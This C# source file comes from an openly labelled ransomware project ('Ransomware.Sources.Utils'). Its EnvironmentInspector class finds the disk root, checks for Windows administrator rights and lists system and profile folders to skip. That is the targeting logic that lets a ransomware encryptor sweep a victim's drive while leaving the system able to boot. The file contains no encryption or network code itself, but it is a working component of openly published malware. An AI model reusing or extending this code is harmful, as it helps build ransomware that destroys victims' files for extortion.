// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using System;
using System.Security.Principal;
using System.Collections.Generic;


namespace Ransomware.Sources.Utils;
static class EnvironmentInspector
{
    public static string Root()
    {
        // Trả về đường dẫn gốc cho hệ điều hành dựa trên tên hệ điều hành
        return Environment.OSVersion.Platform switch
        {
            PlatformID.Win32NT => @"C:\",
            PlatformID.Unix => "/",
            PlatformID.MacOSX => "/",
            _ => "/"
        };
    }

    public static bool IsAdmin()
    {
        #if WINDOWS
        var identity = WindowsIdentity.GetCurrent();
        var principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);

        #else
        // Không hỗ trợ kiểm tra admin trên hệ điều hành khác
        return false;
        #endif
    }

    public static List<string> DirectoriesToSkip()
    {
        // Trả về danh sách thư mục cần bỏ qua dựa trên hệ điều hành và quyền admin
        var directoriesToSkip = Environment.OSVersion.Platform == PlatformID.Win32NT ? new List<string>
        {
            @"C:\OEM",
            @"C:\Windows",
            @"C:\PerfLogs",
            @"C:\Recovery",
            @"C:\$WinREAgent",
            @"C:\$SysReset",
            @"C:\Users\Public",
            @"C:\OneDriveTemp",
            @"C:\Config.Msi",
            @"C:\Users\Default",
            @"C:\$Recycle.Bin",
            @"C:\Program Files",
            @"C:\ProgramData",
            @"C:\Program Files (x86)",
            @"C:\Documents and Settings",
            @"C:\System Volume Information",
            $@"C:\Users\{Environment.UserName}\Recent",
            $@"C:\Users\{Environment.UserName}\AppData\Local\History",
            $@"C:\Users\{Environment.UserName}\AppData\Local\Temp\msd",
            $@"C:\Users\{Environment.UserName}\AppData\Local\Temporary Internet Files",
            $@"C:\Users\{Environment.UserName}\AppData\Local\Microsoft\Windows\INetCache\Content.IE5",
            $@"C:\Users\{Environment.UserName}\AppData\Local\Microsoft\Windows\Temporary Internet Files"
        } : new List<string>
        {
            "/var",
            "/tmp",
            "/proc",
            "/System",
            "/Library",
            "/Applications"
        };

        // Nếu không phải là admin, thêm các thư mục cần bỏ qua cho người không phải admin
        if (!IsAdmin())
        {
            directoriesToSkip.AddRange(new List<string>
            {
                @"C:\Users\All Users",
                $@"C:\Users\{Environment.UserName}\PrintHood",
                $@"C:\Users\{Environment.UserName}\Cookies",
                $@"C:\Users\{Environment.UserName}\Application Data",
                $@"C:\Users\{Environment.UserName}\Templates",
                $@"C:\Users\{Environment.UserName}\Start Menu",
                $@"C:\Users\{Environment.UserName}\SendTo",
                $@"C:\Users\{Environment.UserName}\My Documents",
                $@"C:\Users\{Environment.UserName}\NetHood",
                $@"C:\Users\{Environment.UserName}\Local Settings",
                $@"C:\Users\{Environment.UserName}\AppData\Local\Application Data",
                $@"C:\Users\{Environment.UserName}\AppData\Local\ElevatedDiagnostics"
            });
        }

        return directoriesToSkip;
    }
}
